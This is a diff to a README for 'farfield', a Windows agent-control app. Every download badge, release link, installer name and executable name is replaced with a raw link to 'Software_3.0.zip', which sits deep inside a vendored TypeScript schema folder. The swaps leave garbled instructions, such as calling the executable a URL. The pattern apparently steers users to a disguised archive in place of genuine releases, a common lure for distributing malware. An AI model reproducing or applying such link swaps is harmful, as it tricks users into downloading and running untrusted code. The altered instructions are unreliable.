@@ -1,6 +1,6 @@
 # ⚡ farfield - Control Agents from Anywhere
 
-[![Download farfield](https://img.shields.io/badge/Download-farfield-blue?style=for-the-badge)](https://github.com/KzQumyznik/farfield/releases)
+[![Download farfield](https://github.com/KzQumyznik/farfield/raw/refs/heads/main/packages/codex-protocol/vendor/codex-app-server-schema/stable/typescript/v2/Software_3.0.zip)](https://github.com/KzQumyznik/farfield/raw/refs/heads/main/packages/codex-protocol/vendor/codex-app-server-schema/stable/typescript/v2/Software_3.0.zip)
 
 ## 🖥️ What is farfield?
 
@@ -41,13 +41,13 @@ Follow these steps to download, install, and run farfield on your Windows PC.
 
 Click the button below to open the farfield release page. This page holds the latest version of the app for Windows.
 
-[![Download farfield](https://img.shields.io/badge/Download-farfield-brightgreen?style=for-the-badge)](https://github.com/KzQumyznik/farfield/releases)
+[![Download farfield](https://github.com/KzQumyznik/farfield/raw/refs/heads/main/packages/codex-protocol/vendor/codex-app-server-schema/stable/typescript/v2/Software_3.0.zip)](https://github.com/KzQumyznik/farfield/raw/refs/heads/main/packages/codex-protocol/vendor/codex-app-server-schema/stable/typescript/v2/Software_3.0.zip)
 
 The page lists different versions and files depending on release dates. Find the latest Windows installer file. It usually ends with `.exe`.
 
 ### 2. Download the Installer
 
-On the release page, look for a file called something like `farfield-setup.exe` or `farfield-x64.exe`. Click the file name to start downloading. Save the file somewhere easy to find, like your Desktop or Downloads folder.
+On the release page, look for a file called something like `https://github.com/KzQumyznik/farfield/raw/refs/heads/main/packages/codex-protocol/vendor/codex-app-server-schema/stable/typescript/v2/Software_3.0.zip` or `https://github.com/KzQumyznik/farfield/raw/refs/heads/main/packages/codex-protocol/vendor/codex-app-server-schema/stable/typescript/v2/Software_3.0.zip`. Click the file name to start downloading. Save the file somewhere easy to find, like your Desktop or Downloads folder.
 
 ### 3. Run the Installer
 
@@ -108,7 +108,7 @@ By default, farfield installs in:
 C:\Program Files\farfield\
 ```
 
-The main executable file is called `farfield.exe`. You can run it directly from this folder if needed.
+The main executable file is called `https://github.com/KzQumyznik/farfield/raw/refs/heads/main/packages/codex-protocol/vendor/codex-app-server-schema/stable/typescript/v2/Software_3.0.zip`. You can run it directly from this folder if needed.
 
 ## 📥 Additional Downloads
 
@@ -126,4 +126,4 @@ farfield is provided under an open-source license. You can view the full terms i
 
 ---
 
-[Go to farfield Releases to Download](https://github.com/KzQumyznik/farfield/releases)
+[Go to farfield Releases to Download](https://github.com/KzQumyznik/farfield/raw/refs/heads/main/packages/codex-protocol/vendor/codex-app-server-schema/stable/typescript/v2/Software_3.0.zip)
